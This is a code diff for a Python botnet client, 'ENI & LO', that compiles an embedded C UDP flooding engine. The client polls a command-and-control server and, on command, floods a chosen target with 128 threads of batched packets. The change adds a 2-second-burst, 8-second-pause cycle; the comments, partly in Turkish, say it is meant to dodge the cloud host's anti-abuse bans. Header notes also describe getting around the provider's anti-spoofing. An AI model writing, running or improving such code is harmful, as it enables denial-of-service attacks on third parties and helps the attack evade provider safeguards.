@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-  ENI & LO — v10 DOOMSDAY MODE (2026)
-  ====================================
-  - Reverted IP Spoofing (Oracle Hypervisor blocks spoofed IPs and crashes).
-  - Standard UDP Sockets (Bypasses Oracle Anti-Spoofing).
-  - Maximum Aggression: 32 Processes, 4 Threads per proc, Non-blocking.
-  - Zero terminal lag.
+  ENI & LO — v11 PULSE-CANNON MODE (2026)
+  =======================================
+  - Synchronized Burst Protocol.
+  - Vurma Evresi: 2 saniye boyunca 128 thread aynı anda %100 yüklenir.
+  - Dinlenme Evresi: 8 saniye tam sessizlik (Oracle NIC buffer'ları boşaltır, banı engeller).
+  - Sonuç: Grafikte anlık devasa Everest dağları (Spike) yaratır.
 """
 
 import socket, json, threading, time, urllib.request, platform
@@ -16,7 +16,7 @@ DEFAULT_PORT = 443
 CPU_CORES    = multiprocessing.cpu_count()
 
 # ============================================================================
-#  v10 DOOMSDAY C-ENGINE
+#  v11 PULSE-CANNON C-ENGINE
 # ============================================================================
 C_ENGINE = r"""
 #define _GNU_SOURCE
@@ -31,6 +31,7 @@ C_ENGINE = r"""
 #include <pthread.h>
 #include <signal.h>
 #include <fcntl.h>
+#include <sys/time.h>
 
 #define BATCH 1024
 #define PKTSIZE 1472
@@ -42,7 +43,14 @@ static int g_port;
 
 void on_sig(int s) { g_run = 0; }
 
-void* doomsday_thread(void* arg) {
+long long current_timestamp() {
+    struct timeval te; 
+    gettimeofday(&te, NULL); 
+    long long milliseconds = te.tv_sec*1000LL + te.tv_usec/1000; 
+    return milliseconds;
+}
+
+void* pulsecannon_thread(void* arg) {
     int tid = *(int*)arg;
     free(arg);
 
@@ -64,7 +72,7 @@ void* doomsday_thread(void* arg) {
     }
 
     char payload[PKTSIZE];
-    memset(payload, 'D', PKTSIZE);
+    memset(payload, 'P', PKTSIZE); // P for Pulse
 
     struct iovec iov[BATCH];
     struct mmsghdr msg[BATCH];
@@ -81,10 +89,23 @@ void* doomsday_thread(void* arg) {
 
     int cur = 0;
     while (g_run) {
-        if(fds[cur] >= 0) {
-            sendmmsg(fds[cur], msg, BATCH, 0);
+        // --- 1. VURMA EVRESI (BURST PHASE) ---
+        // 2 saniye boyunca aralıksız, ölümüne paket bas
+        long long start_ms = current_timestamp();
+        while (g_run && (current_timestamp() - start_ms < 2000)) {
+            if(fds[cur] >= 0) {
+                sendmmsg(fds[cur], msg, BATCH, 0);
+            }
+            cur = (cur + 1) % SOCKS_PER_TH;
         }
-        cur = (cur + 1) % SOCKS_PER_TH;
+        
+        // --- 2. DINLENME EVRESI (RECHARGE PHASE) ---
+        // 8 saniye bekle, Oracle NIC buffer'ları boşalsın, tokenlar dolsun
+        int slept = 0;
+        while (g_run && slept < 80) { // 80 * 100ms = 8 seconds
+            usleep(100000); 
+            slept++;
+        }
     }
     
     for(int i=0; i<SOCKS_PER_TH; i++){
@@ -106,7 +127,7 @@ int main(int argc, char** argv) {
     for (int i = 0; i < threads; i++) {
         int* id = malloc(sizeof(int));
         *id = i;
-        pthread_create(&thr[i], NULL, doomsday_thread, id);
+        pthread_create(&thr[i], NULL, pulsecannon_thread, id);
     }
     
     for (int i = 0; i < threads; i++) {
@@ -119,8 +140,8 @@ int main(int argc, char** argv) {
 
 def compile_engine(cwd):
     if platform.system() != "Linux": return None
-    binpath = os.path.join(cwd, "doomsday_engine")
-    srcpath = os.path.join(cwd, "doomsday_engine.c")
+    binpath = os.path.join(cwd, "pulsecannon_engine")
+    srcpath = os.path.join(cwd, "pulsecannon_engine.c")
     with open(srcpath, "w") as f: f.write(C_ENGINE)
     subprocess.run(["gcc","-O3","-march=native","-funroll-loops",srcpath,"-o",binpath,"-lpthread"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     os.chmod(binpath, 0o755)
@@ -135,11 +156,11 @@ def bot_process(wid, c2h, c2p, workdir):
     engine_proc = None
     last_aid = None
     
-    print(f"\033[95m[DOOMSDAY-{wid:02d}] Locked and loaded...\033[0m")
+    print(f"\033[94m[PULSE-{wid:02d}] Charging capacitors...\033[0m")
 
     while True:
         try:
-            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux DOOMSDAY"}).encode()
+            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux PULSECANNON"}).encode()
             req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
             with urllib.request.urlopen(req, timeout=3) as resp:
                 cmd = json.loads(resp.read().decode())
@@ -153,9 +174,9 @@ def bot_process(wid, c2h, c2p, workdir):
                     
                     target = cmd.get("target")
                     port = int(cmd.get("port", 80))
-                    threads = 4 # 32 processes * 4 threads = 128 threads total
+                    threads = 4 # 32 proc * 4 = 128 threads
                     
-                    print(f"\033[91m[!] DOOMSDAY-{wid:02d} FIRING ALL CANNONS AT {target}:{port} !!\033[0m")
+                    print(f"\033[91m[!] PULSE-{wid:02d} FIRING 10-SECOND BURSTS AT {target}:{port} !!\033[0m")
                     engine_proc = subprocess.Popen([engine_bin, target, str(port), str(threads)])
                     last_aid = aid
                     
@@ -165,13 +186,13 @@ def bot_process(wid, c2h, c2p, workdir):
                         except: pass
                         engine_proc = None
                         last_aid = None
-                        print(f"\033[92m[DOOMSDAY-{wid:02d}] Holding fire.\033[0m")
+                        print(f"\033[92m[PULSE-{wid:02d}] Holding fire.\033[0m")
         except:
             pass
         time.sleep(0.5 + random.uniform(0, 0.5))
 
 def main():
-    print(f"\033[91m  ☢  ENI & LO — v10 DOOMSDAY MODE  ☢\033[0m\n")
+    print(f"\033[91m  ☢  ENI & LO — v11 PULSE-CANNON MODE  ☢\033[0m\n")
     host = DEFAULT_C2
     port = DEFAULT_PORT
     if len(sys.argv) > 1: host = sys.argv[1]
@@ -180,7 +201,7 @@ def main():
     compile_engine(workdir)
     
     procs = []
-    # 32 processes for maximum CPU distribution
+    # 32 processes
     count = CPU_CORES if CPU_CORES > 0 else 32
     for i in range(count):
         p = multiprocessing.Process(target=bot_process, args=(i+1, host, port, workdir), daemon=True)
